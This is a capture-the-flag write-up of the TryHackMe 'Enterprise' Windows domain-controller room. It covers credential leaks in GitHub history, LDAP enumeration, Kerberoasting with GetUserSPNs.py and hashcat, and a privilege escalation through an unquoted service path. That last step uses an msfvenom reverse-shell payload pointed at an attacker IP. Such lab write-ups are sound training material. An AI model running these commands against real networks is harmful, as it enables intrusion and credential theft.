# Enterprise

https://tryhackme.com/room/enterprise

A windows machine, which is an area I don't have much experience in (ironically, since my main PCs are all windows machines, for gaming etc). I tapped away at it for a few days, learning heaps, but ultimately required a hint to get a foothold. Just one though!

Enumeration revealed dozens of ports, as is typical for windows. Importantly, there were three websites, SMB, RDP and LDAP ports open, so these were enumerated seperately.

## HTTP

The websites had nothing on them, no hidden directories etc. Robots.txt under :80 contained nothing but a statement saying robots was silly on a domain controller server, which is accurate.

Another of the websites though, port 7990 had an atlassian login page. A glance at the source showed it was a cloned copy of an atlassian page, not functional. On the heading of the page though, was the message: "Reminder to all Enterprise-THM Employees: We are moving to Github!".

I did a search on github for "Enterprise-THM" and found a user/org with a single repo, containing nothing of note. The org had another user under "People", who went I went through had a powershell script available. The script ran against AD, but had a blank username and password. HOWEVER, under its history, the original files had those values still present! So I had a valid user and password for the machine, for a user named 'nik'.

## SMB

There were two folders I could reach under SMB, Docs and Users. Docs contained two office documents, a word doc and an excel sheet, both 'RSA' protected. I couldn't open them without a password, and trying to crack these with office2john got me nowhere.

Under Users, I had basically the Users directory on windows shared. As an anonymous user, I could access LAB-ADMIN, but nothing immediately stood out; most folders were empty. Under AppData though, I got the powershell command history, which revealed another username / password, being used as basic auth against some service. I couldn't see how to use these, and they might have been a red herring.

## LDAP

with the nik user, I could enumerate LDAP. I used several commands for this:

`ldapsearch -h 10.10.12.162 -b "DC=LAB,DC=ENTERPRISE,DC=THM" -x -D "nik" -w "<redacted>" | grep password` revealed there was a password in the system for a user

I used `ldapdomaindump 10.10.12.162 -u "LAB.ENTERPRISE.THM\nik" -p "<redacted>" -o results` to get a more browsable version, which identified a second username and password for the user `contractor-temp`, who was part of the `sensitive-users` group.

## MSTSC / RDP

Neither nik nor corporate-temp could log in over RDP, so moving on.

## SPN

This was the thing I required a tip for: I had never heard of SPNs before.

With these two users, nik and corporate-temp, I used the command `python2 ./GetUserSPNs.py LAB.ENTERPRISE.THM/contractor-temp:redacted` to list service principle names. It revealed one for a user name 'bitbucket'. Using the same command with `-request` got me a hash, which I then cracked with hashcat via `hashcat -m 13100 hash rockyou.txt` to get the bitbucket user's password.

## MSTSC / RDP again and/or SMB

The bitbucket user *could* connect over RDP, so I did and got the user flag. Notably, I could also use this user with SMBClient which gave me direct access to their User folder via the Users share, where the user flag was also retrievable.

## Privesc to root

For privesc, I started by looking for unquoted service paths, and immediately discovered a service where this was true and I had the right write access.

Initially I used PowerUp (https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) for this, which gave me a command to run to create a compromised binary, however the service would not start. I suspect because this would add a user, and that wasn't permitted. Instead I used the following msfvenom command: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.173.117 LPORT=4444 -f exe-service -o Zero.exe`, which I dropped at `c:\Program Files (x86)\Zero Tier\Zero.exe`, then started the service via `Start-Service` and boom, I had a system shell :) THe final flag was in the Desktop folder of the Administrator user.
